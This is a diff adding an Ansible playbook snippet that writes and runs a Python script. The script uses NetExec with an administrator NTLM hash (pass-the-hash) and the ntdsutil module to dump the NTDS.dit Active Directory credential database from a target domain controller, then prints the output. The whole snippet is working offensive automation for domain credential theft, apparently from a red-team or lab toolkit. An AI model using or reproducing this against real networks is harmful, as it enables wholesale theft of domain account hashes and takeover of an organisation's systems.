@@ -1,1 +1,31 @@
+---
+- name: NTDS
+  copy:
+    dest: /opt/ntds.py
+    content: |
+      import subprocess
 
+      username = "{{ admin }}"
+      hash= "{{ ntlm_admin }}"
+      domain="{{ domain }}"
+      target_ip="{{ target_ip_admin }}"
+
+      command= f"nxc smb {target_ip} -u {username} -H {hash} -M ntdsutil"
+      result = subprocess.run(command, shell=True, capture_output=True, text=True)
+      if result.returncode == 0:
+         print("Execution of Ntdsutil")
+
+
+- name: Make the script executable
+  file:
+    path: /opt/ntds.py
+    mode: '0755'
+
+- name: Run the NTDS
+  shell: python3 /opt/ntds.py
+  register: ntds_output
+
+
+- name: Display the output
+  debug:
+    msg: "{{ ntds_output.stdout }}"
